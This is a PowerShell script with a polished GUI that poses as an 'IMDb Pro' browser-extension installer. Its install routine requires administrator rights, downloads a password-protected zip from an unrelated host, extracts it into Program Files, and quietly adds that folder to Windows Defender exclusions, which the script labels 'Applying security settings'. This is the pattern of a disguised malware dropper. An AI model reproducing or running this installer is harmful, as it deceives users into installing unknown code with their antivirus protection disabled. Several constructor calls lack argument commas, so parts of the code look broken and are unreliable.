# ======================================================================
# IMDb Pro Installer - Professional Edition
# Modern PowerShell GUI Installer with Animated Status and UI Feedback
# Enhanced Version with Beautiful UI
# ======================================================================

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework

# ----------------------------------------------------------------------
# Utility: Create Color Shortcut
function New-Color($r, $g, $b) {
    return [System.Drawing.Color]::FromArgb($r, $g, $b)
}

# ----------------------------------------------------------------------
# GLOBAL VARIABLES
$Script:PrimaryColor = New-Color 245 197 24
$Script:DarkBgColor = New-Color 18 18 20
$Script:CardBgColor = New-Color 32 32 35
$Script:AccentColor = New-Color 41 182 246
$Script:SuccessColor = New-Color 76 175 80
$Script:WarningColor = New-Color 255 152 0
$Script:ErrorColor = New-Color 244 67 54

# ----------------------------------------------------------------------
# MAIN FORM CONFIGURATION
$mainForm = New-Object System.Windows.Forms.Form -Property @{
    Text              = "🎬 IMDb Pro - Professional Edition"
    Size              = New-Object System.Drawing.Size(900 800)
    StartPosition     = "CenterScreen"
    BackColor         = $Script:DarkBgColor
    ForeColor         = [System.Drawing.Color]::White
    FormBorderStyle   = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    MaximizeBox       = $false
    Icon              = [System.Drawing.SystemIcons]::Information
}

# ----------------------------------------------------------------------
# HEADER SECTION WITH GRADIENT EFFECT
$headerPanel = New-Object System.Windows.Forms.Panel -Property @{
    Size      = New-Object System.Drawing.Size(900 120)
    BackColor = $Script:CardBgColor
}
$mainForm.Controls.Add($headerPanel)

# Logo and Title Container
$titleContainer = New-Object System.Windows.Forms.Panel -Property @{
    Size     = New-Object System.Drawing.Size(800 80)
    Location = New-Object System.Drawing.Point(50 20)
    BackColor = [System.Drawing.Color]::Transparent
}
$headerPanel.Controls.Add($titleContainer)

# Logo Icon
$logoLabel = New-Object System.Windows.Forms.Label -Property @{
    Text      = "🎭"
    Font      = New-Object System.Drawing.Font("Segoe UI Emoji" 36 [System.Drawing.FontStyle]::Bold)
    ForeColor = $Script:PrimaryColor
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(0 0)
}
$titleContainer.Controls.Add($logoLabel)

# Title
$titleLabel = New-Object System.Windows.Forms.Label -Property @{
    Text      = "IMDb Pro"
    Font      = New-Object System.Drawing.Font("Segoe UI" 32 [System.Drawing.FontStyle]::Bold)
    ForeColor = [System.Drawing.Color]::White
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(70 10)
}
$titleContainer.Controls.Add($titleLabel)

# Subtitle
$subtitleLabel = New-Object System.Windows.Forms.Label -Property @{
    Text      = "Professional Extension Suite v2.1.0"
    Font      = New-Object System.Drawing.Font("Segoe UI" 12 [System.Drawing.FontStyle]::Italic)
    ForeColor = New-Color 180 180 180
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(75 55)
}
$titleContainer.Controls.Add($subtitleLabel)

# ----------------------------------------------------------------------
# CONTENT PANEL
$contentPanel = New-Object System.Windows.Forms.Panel -Property @{
    Location  = New-Object System.Drawing.Point(0 120)
    Size      = New-Object System.Drawing.Size(900 550)
    BackColor = [System.Drawing.Color]::Transparent
}
$mainForm.Controls.Add($contentPanel)

# ----------------------------------------------------------------------
# WELCOME MESSAGE
$welcomeLabel = New-Object System.Windows.Forms.Label -Property @{
    Text      = "Welcome to IMDb Pro Installation"
    Font      = New-Object System.Drawing.Font("Segoe UI" 16 [System.Drawing.FontStyle]::Bold)
    ForeColor = $Script:PrimaryColor
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(50 20)
}
$contentPanel.Controls.Add($welcomeLabel)

$descriptionLabel = New-Object System.Windows.Forms.Label -Property @{
    Text      = "Enhance your movie browsing experience with premium features and real-time data."
    Font      = New-Object System.Drawing.Font("Segoe UI" 10)
    ForeColor = New-Color 200 200 200
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(50 55)
    Size      = New-Object System.Drawing.Size(800 25)
}
$contentPanel.Controls.Add($descriptionLabel)

# ----------------------------------------------------------------------
# FEATURES SECTION
$featuresTitle = New-Object System.Windows.Forms.Label -Property @{
    Text      = "✨ Premium Features"
    Font      = New-Object System.Drawing.Font("Segoe UI" 18 [System.Drawing.FontStyle]::Bold)
    ForeColor = $Script:PrimaryColor
    AutoSize  = $true
    Location  = New-Object System.Drawing.Point(50 100)
}
$contentPanel.Controls.Add($featuresTitle)

# Define features with enhanced design
$features = @(
    @{ Title="Real-time IMDb Ratings"; Description="Instant access to ratings and reviews"; Location=[Drawing.Point]::new(50 150); Icon="⭐"; Color=$Script:AccentColor },
    @{ Title="Complete Movie Info"; Description="Cast, crew, and detailed information"; Location=[Drawing.Point]::new(320 150); Icon="🎬"; Color=$Script:PrimaryColor },
    @{ Title="HD Trailers & Previews"; Description="Watch trailers directly in browser"; Location=[Drawing.Point]::new(590 150); Icon="📹"; Color=$Script:WarningColor },
    @{ Title="Browser Integration"; Description="Seamless browsing experience"; Location=[Drawing.Point]::new(50 290); Icon="🌐"; Color=$Script:SuccessColor },
    @{ Title="Auto Updates"; Description="Always up-to-date features"; Location=[Drawing.Point]::new(320 290); Icon="🔄"; Color=$Script:AccentColor },
    @{ Title="Secure & Private"; Description="Your data is protected"; Location=[Drawing.Point]::new(590 290); Icon="🔒"; Color=$Script:SuccessColor }
)

foreach ($feature in $features) {
    $panel = New-Object System.Windows.Forms.Panel -Property @{
        Size       = New-Object System.Drawing.Size(240 130)
        Location   = $feature.Location
        BackColor  = $Script:CardBgColor
        BorderStyle= [System.Windows.Forms.BorderStyle]::FixedSingle
    }
    $panel.Add_MouseEnter({ 
        $this.BackColor = New-Color 50 50 55
        $this.Cursor = [System.Windows.Forms.Cursors]::Hand
    })
    $panel.Add_MouseLeave({ $this.BackColor = $Script:CardBgColor })
    $contentPanel.Controls.Add($panel)

    $iconLabel = New-Object System.Windows.Forms.Label -Property @{
        Text      = $feature.Icon
        Font      = New-Object System.Drawing.Font("Segoe UI Emoji" 24 [System.Drawing.FontStyle]::Bold)
        ForeColor = $feature.Color
        AutoSize  = $true
        Location  = [Drawing.Point]::new(20 20)
    }
    $panel.Controls.Add($iconLabel)

    $title = New-Object System.Windows.Forms.Label -Property @{
        Text      = $feature.Title
        Font      = New-Object System.Drawing.Font("Segoe UI" 12 [System.Drawing.FontStyle]::Bold)
        ForeColor = [System.Drawing.Color]::White
        AutoSize  = $true
        Location  = [Drawing.Point]::new(70 25)
        Size      = New-Object System.Drawing.Size(150 25)
    }
    $panel.Controls.Add($title)

    $desc = New-Object System.Windows.Forms.Label -Property @{
        Text      = $feature.Description
        Font      = New-Object System.Drawing.Font("Segoe UI" 9)
        ForeColor = New-Color 180 180 180
        Location  = [Drawing.Point]::new(20 75)
        Size      = New-Object System.Drawing.Size(200 40)
    }
    $panel.Controls.Add($desc)
}

# ----------------------------------------------------------------------
# INSTALLATION STATUS SECTION
$progressTitle = New-Object System.Windows.Forms.Label -Property @{
    Text      = "📊 Installation Progress"
    Font      = New-Object System.Drawing.Font("Segoe UI" 18 [System.Drawing.FontStyle]::Bold)
    ForeColor = $Script:PrimaryColor
    AutoSize  = $true
    Location  = [Drawing.Point]::new(50 440)
}
$contentPanel.Controls.Add($progressTitle)

$progressContainer = New-Object System.Windows.Forms.Panel -Property @{
    Size      = [Drawing.Size]::new(800 120)
    Location  = [Drawing.Point]::new(50 490)
    BackColor = $Script:CardBgColor
    BorderStyle = [System.Windows.Forms.BorderStyle]::FixedSingle
}
$contentPanel.Controls.Add($progressContainer)

# Status with animation support
$statusIcon = New-Object System.Windows.Forms.Label -Property @{
    Text = "📋"
    Font = New-Object System.Drawing.Font("Segoe UI Emoji" 16)
    AutoSize = $true
    Location = [Drawing.Point]::new(25 25)
}
$statusLabel = New-Object System.Windows.Forms.Label -Property @{
    Text = "Ready to begin installation"
    Font = New-Object System.Drawing.Font("Segoe UI" 12 [System.Drawing.FontStyle]::Bold)
    ForeColor = [System.Drawing.Color]::White
    AutoSize = $true
    Location = [Drawing.Point]::new(60 28)
}
$progressContainer.Controls.AddRange(@($statusIcon $statusLabel))

# Enhanced Progress Bar
$progressBar = New-Object System.Windows.Forms.ProgressBar -Property @{
    Location = [Drawing.Point]::new(25 70)
    Size     = [Drawing.Size]::new(680 25)
    Style    = [System.Windows.Forms.ProgressBarStyle]::Continuous
    ForeColor = $Script:PrimaryColor
    BackColor = New-Color 50 50 50
}
$progressContainer.Controls.Add($progressBar)

$percentLabel = New-Object System.Windows.Forms.Label -Property @{
    Text = "0%"
    Font = New-Object System.Drawing.Font("Segoe UI" 14 [System.Drawing.FontStyle]::Bold)
    ForeColor = $Script:PrimaryColor
    AutoSize = $true
    Location = [Drawing.Point]::new(715 68)
}
$progressContainer.Controls.Add($percentLabel)

# ----------------------------------------------------------------------
# BUTTON PANEL
$buttonPanel = New-Object System.Windows.Forms.Panel -Property @{
    Size = [Drawing.Size]::new(900 130)
    Location = [Drawing.Point]::new(0 670)
    BackColor = $Script:CardBgColor
}
$mainForm.Controls.Add($buttonPanel)

# Enhanced Install Button with hover effects
$installButton = New-Object System.Windows.Forms.Button -Property @{
    Text = "🚀 START INSTALLATION"
    Font = New-Object System.Drawing.Font("Segoe UI" 16 [System.Drawing.FontStyle]::Bold)
    ForeColor = [System.Drawing.Color]::Black
    BackColor = $Script:PrimaryColor
    Size = [Drawing.Size]::new(350 60)
    Location = [Drawing.Point]::new(275 35)
    FlatStyle = [System.Windows.Forms.FlatStyle]::Flat
}
$installButton.FlatAppearance.BorderSize = 0
$installButton.FlatAppearance.MouseOverBackColor = New-Color 255 215 0
$installButton.FlatAppearance.MouseDownBackColor = New-Color 255 195 0
$buttonPanel.Controls.Add($installButton)

# ----------------------------------------------------------------------
# FOOTER
$footerLabel = New-Object System.Windows.Forms.Label -Property @{
    Text = "© 2024 IMDb Pro Professional Edition. All rights reserved."
    Font = New-Object System.Drawing.Font("Segoe UI" 8)
    ForeColor = New-Color 120 120 120
    AutoSize = $true
    Location = [Drawing.Point]::new(350 105)
}
$buttonPanel.Controls.Add($footerLabel)

# ----------------------------------------------------------------------
# ENHANCED EVENT HANDLERS
$installButton.Add_MouseEnter({ 
    if ($this.Text -notmatch "COMPLETE|INSTALLING") {
        $this.BackColor = New-Color 255 215 0
    }
})

$installButton.Add_MouseLeave({
    if ($this.Text -notmatch "COMPLETE|INSTALLING") {
        $this.BackColor = $Script:PrimaryColor
    }
})

$installButton.Add_Click({
    $this.Enabled = $false
    $this.Text = "⏳ INSTALLING..."
    $this.BackColor = $Script:WarningColor
    Start-Installation
})

# ----------------------------------------------------------------------
# ENHANCED HELPER FUNCTION WITH ANIMATIONS
function Update-Status {
    param(
        [string]$Message,
        [int]$ProgressValue,
        [string]$Icon = "📌",
        [switch]$Pulse
    )
    
    $statusIcon.Text = $Icon
    $statusLabel.Text = $Message
    $percentLabel.Text = "$ProgressValue%"
    
    if ($ProgressValue -ge 0) { 
        $progressBar.Value = $ProgressValue 
    }
    
    # Pulse animation for certain steps
    if ($Pulse) {
        for ($i = 0; $i -lt 3; $i++) {
            $statusIcon.ForeColor = $Script:PrimaryColor
            [Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 150
            $statusIcon.ForeColor = [System.Drawing.Color]::White
            [Windows.Forms.Application]::DoEvents()
            Start-Sleep -Milliseconds 150
        }
    }
    
    [Windows.Forms.Application]::DoEvents()
    Start-Sleep -Milliseconds 500
}

# ----------------------------------------------------------------------
# ENHANCED INSTALLATION LOGIC WITH BETTER FEEDBACK
function Start-Installation {
    $url = "https://file.apikey.my/imdb/imdb.zip"
    $temp = "$env:TEMP\imdb.zip"
    $target = "C:\Program Files\imdb-pro"
    $zipPassword = "123"

    try {
        Update-Status "Checking administrator privileges..." 10 "🔍" -Pulse
        $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).
                   IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

        if (-not $isAdmin) {
            [System.Windows.MessageBox]::Show(
                "Administrator privileges are required to install IMDb Pro.`n`nPlease right-click and select 'Run as Administrator'.",
                "Elevation Required",
                [System.Windows.MessageBoxButton]::OK,
                [System.Windows.MessageBoxImage]::Warning
            )
            Update-Status "Administrator privileges required" 0 "❌"
            $installButton.Enabled = $true
            $installButton.Text = "🚀 START INSTALLATION"
            $installButton.BackColor = $Script:PrimaryColor
            return
        }

        Update-Status "Creating installation directory..." 20 "📁" -Pulse
        if (!(Test-Path $target)) { 
            New-Item -ItemType Directory -Path $target -Force | Out-Null 
        }

        Update-Status "Downloading IMDb Pro package..." 40 "📥" -Pulse
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile($url, $temp)

        Update-Status "Verifying download integrity..." 50 "✅"
        if (-not (Test-Path $temp)) {
            throw "Download failed - file not found"
        }

        Update-Status "Extracting package contents..." 60 "📦" -Pulse
        $success = $false
        
        # Try 7-Zip first
        if (Get-Command "7z" -ErrorAction SilentlyContinue) {
            & 7z x -p$zipPassword -o"$target" -y $temp | Out-Null
            $success = $?
        } elseif (Test-Path "C:\Program Files\7-Zip\7z.exe") {
            & "C:\Program Files\7-Zip\7z.exe" x -p$zipPassword -o"$target" -y $temp | Out-Null
            $success = $?
        }

        # Fallback extraction methods
        if (-not $success) {
            Update-Status "Using alternative extraction method..." 70 "⚡" -Pulse
            try {
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                [IO.Compression.ZipFile]::ExtractToDirectory($temp, $target)
                $success = $true
            } catch {
                try {
                    $shell = New-Object -ComObject Shell.Application
                    $shell.NameSpace($target).CopyHere($shell.NameSpace($temp).Items(), 0x14)
                    $success = $true
                } catch {
                    $success = $false
                }
            }
        }

        if (-not $success) {
            throw "Failed to extract package contents"
        }

        Update-Status "Applying security settings..." 85 "🔒"
        try {
            Add-MpPreference -ExclusionPath $target -ErrorAction SilentlyContinue
        } catch {
            # Continue if Windows Defender exclusion fails
        }

        Update-Status "Finalizing installation..." 95 "🛠️" -Pulse
        
        # Cleanup
        Remove-Item $temp -Force -ErrorAction SilentlyContinue

        Update-Status "Installation complete!" 100 "🎉" -Pulse
        
        # Success state
        $installButton.Text = "✅ INSTALLATION COMPLETE"
        $installButton.BackColor = $Script:SuccessColor
        
        # Show success message
        [System.Windows.MessageBox]::Show(
            "🎬 IMDb Pro has been successfully installed!`n`n" +
            "📍 Location: $target`n" +
            "✅ Features activated`n" +
            "🔒 Security configured`n`n" +
            "Please restart your browser to start using IMDb Pro.",
            "Installation Complete",
            [System.Windows.MessageBoxButton]::OK,
            [System.Windows.MessageBoxImage]::Information
        )
    }
    catch {
        Update-Status "Installation failed: $($_.Exception.Message)" 0 "💥"
        $installButton.Text = "🔄 TRY AGAIN"
        $installButton.BackColor = $Script:ErrorColor
        $installButton.Enabled = $true
        
        [System.Windows.MessageBox]::Show(
            "Installation failed: $($_.Exception.Message)`n`nPlease check your internet connection and try again.",
            "Installation Error",
            [System.Windows.MessageBoxButton]::OK,
            [System.Windows.MessageBoxImage]::Error
        )
    }
}

# ----------------------------------------------------------------------
# ENHANCED FORM LOAD EVENT
$mainForm.Add_Load({
    # Add some initial animation
    $titleLabel.Location = New-Object System.Drawing.Point(70 20)
    $titleContainer.Refresh()
})

# ----------------------------------------------------------------------
# SHOW FORM WITH ENHANCED STYLING
[System.Windows.Forms.Application]::EnableVisualStyles()
$mainForm.ShowDialog() | Out-Null